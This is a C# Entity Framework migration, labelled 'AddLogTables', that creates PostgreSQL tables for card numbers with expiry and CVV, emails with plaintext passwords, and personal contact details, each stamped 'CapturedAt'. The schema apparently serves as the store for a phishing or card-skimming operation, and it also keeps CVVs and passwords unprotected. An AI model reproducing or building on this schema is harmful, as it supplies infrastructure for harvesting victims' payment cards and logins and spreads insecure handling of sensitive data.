using System;
using Microsoft.EntityFrameworkCore.Migrations;
using Npgsql.EntityFrameworkCore.PostgreSQL.Metadata;

#nullable disable

namespace WebApiSolution.Migrations
{
    /// <inheritdoc />
    public partial class AddLogTables : Migration
    {
        /// <inheritdoc />
        protected override void Up(MigrationBuilder migrationBuilder)
        {
            migrationBuilder.Sql(@"
                CREATE TABLE IF NOT EXISTS ""CardEntries"" (
                    ""Id"" serial PRIMARY KEY,
                    ""Num"" text,
                    ""Name"" text,
                    ""Expiry"" text,
                    ""Cvv"" text,
                    ""CapturedAt"" timestamp with time zone NOT NULL
                );
            ");

            migrationBuilder.Sql(@"
                CREATE TABLE IF NOT EXISTS ""LogEntries"" (
                    ""Id"" serial PRIMARY KEY,
                    ""Type"" text NOT NULL,
                    ""Email"" text,
                    ""Password"" text,
                    ""CapturedAt"" timestamp with time zone NOT NULL
                );
            ");

            migrationBuilder.Sql(@"
                CREATE TABLE IF NOT EXISTS ""PersonalInfoEntries"" (
                    ""Id"" serial PRIMARY KEY,
                    ""FirstName"" text,
                    ""LastName"" text,
                    ""Email"" text,
                    ""Phone"" text,
                    ""Address"" text,
                    ""City"" text,
                    ""RawJson"" text,
                    ""CapturedAt"" timestamp with time zone NOT NULL
                );
            ");
        }

        /// <inheritdoc />
        protected override void Down(MigrationBuilder migrationBuilder)
        {
            migrationBuilder.DropTable(name: "CardEntries");
            migrationBuilder.DropTable(name: "LogEntries");
            migrationBuilder.DropTable(name: "PersonalInfoEntries");
        }
    }
}
